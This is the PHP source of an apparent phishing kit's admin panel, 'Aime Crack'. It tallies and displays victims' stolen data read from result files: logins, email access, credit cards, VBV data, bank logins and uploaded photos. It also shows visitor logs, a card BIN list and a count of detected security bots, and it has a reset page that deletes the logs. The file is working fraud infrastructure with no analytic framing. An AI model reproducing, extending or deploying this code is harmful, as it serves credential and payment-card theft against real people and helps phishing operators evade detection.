<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
$email = $_POST['email'];
$password = $_POST['password'];
$key = $_POST['key'];
$page = $_GET['p'];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Aime Crack - Admin Panel</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->  
    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->  
    <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->  
    <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="css/util.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
<?php 
if($page == "") {
    echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
}


if($page == "home") {
$click = "../result/total_click.txt";
$file = fopen($click, "r");
$total_click = fread($file, filesize($click));
$total_click = substr_count($total_click, "\n");
fclose($file);
if($total_click == 0) {
    $total_click = "$total_click";
}else{
    $total_click = "$total_click";
}

$click = "../result/total_login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "\n");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../result/total_cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "\n");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../result/total_vbv.txt";
$file = fopen($click, "r");
$total_vbv = fread($file, filesize($click));
$total_vbv = substr_count($total_vbv, "\n");
fclose($file);
if($total_vbv == 0) {
    $total_vbv = "$total_vbv";
}else{
    $total_vbv = "$total_vbv";
}

$click = "../result/total_bank.txt";
$file = fopen($click, "r");
$total_bank = fread($file, filesize($click));
$total_bank = substr_count($total_bank, "\n");
fclose($file);
if($total_bank == 0) {
    $total_bank = "$total_bank";
}else{
    $total_bank = "$total_bank";
}

$click = "../result/total_upload.txt";
$file = fopen($click, "r");
$total_photo = fread($file, filesize($click));
$total_photo = substr_count($total_photo, "\n");
fclose($file);
if($total_photo == 0) {
    $total_photo = "$total_photo";
}else{
    $total_photo = "$total_photo";
}

$click = "../result/total_email.txt";
$file = fopen($click, "r");
$total_email = fread($file, filesize($click));
$total_email = substr_count($total_email, "\n");
fclose($file);
if($total_email == 0) {
    $total_email = "$total_email";
}else{
    $total_email = "$total_email";
}

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$total_botnya = fread($file, filesize($click));
$total_botnya = substr_count($total_botnya, "\n");
fclose($file);
if($total_botnya == 0) {
    $total_botnya = "$total_botnya";
}else{
    $total_botnya = "$total_botnya";
}

$click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
            <div style="margin-top:-2px;background:#000;text-align:center;">

            </div>
                <div class="login-form-title">
       
                    
                </div>

                <div class="login100-form">
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Click</span>
                        <input class="input100" type="text" value="'.$total_click.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Login</span>
                        <input class="input100" type="text" value="'.$total_login.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                     <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Email Access</span>
                        <input class="input100" type="text" value="'.$total_email.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Credit Card</span>
                        <input class="input100" type="text" value="'.$total_cc.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">VBV</span>
                        <input class="input100" type="text" value="'.$total_vbv.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Bank Login</span>
                        <input class="input100" type="text" value="'.$total_bank.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Upload Photo</span>
                        <input class="input100" type="text" value="'.$total_photo.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">Bot Detected</span>
                        <input class="input100" type="text" value="'.$total_botnya.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    

                    <div class="container-login100-form-btn">
                        <a style="text-decoration:none;color:#fff;" href="index.php?p=resetdata">
                        <span style="background:#000;" class="login100-form-btn">
                         Reset Data
                        </span></a>
                       
                        
                        
                    </div>
                </div>
            </div>
        </div>
    </div>';
      $click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
$log_visitor = "\n".$log_visitor;
fclose($file);
$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
$log_bot = "\n".$log_bot;
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
$log_bin = "\n".$log_bin;
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            </div>
                <div class="login-form-title>
                <br><br><br><br>
                    
                </div>

                    <br><span style="margin-left:20px;"><b>Log Visitor</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_visitor.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>BIN List</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bin.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>Bot Detected</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bot.'
                    </textarea>
                    <br><br>
                    <br>
            </div>
        </div>
    </div>';
}





if($page == "resetdata") {

    unlink("../result/total_login.txt");
    unlink("../result/total_email.txt");
    unlink("../result/total_cc.txt");
    unlink("../result/total_vbv.txt");
    unlink("../result/total_bot.txt");
    unlink("../result/total_bin.txt");
    unlink("../result/total_upload.txt");
    unlink("../result/total_click.txt");
    unlink("../result/total_bank.txt");
    unlink("../result/log_visitor.txt");
    echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
}

?>
<!--===============================================================================================-->
    <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/bootstrap/js/popper.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/daterangepicker/moment.min.js"></script>
    <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
    <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
    <script src="js/main.js"></script>

</body>
</html>